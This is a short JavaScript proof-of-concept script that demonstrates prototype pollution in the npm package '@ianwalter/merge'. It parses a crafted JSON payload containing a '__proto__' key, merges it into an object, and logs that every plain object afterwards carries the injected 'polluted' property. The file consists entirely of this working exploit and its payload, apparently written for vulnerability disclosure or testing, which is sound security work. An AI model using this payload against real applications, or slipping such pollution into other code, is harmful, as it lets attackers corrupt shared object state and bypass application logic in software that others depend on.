var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const merge = require('@ianwalter/merge');
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
merge(obj, EVIL_JSON);
console.log({}.polluted);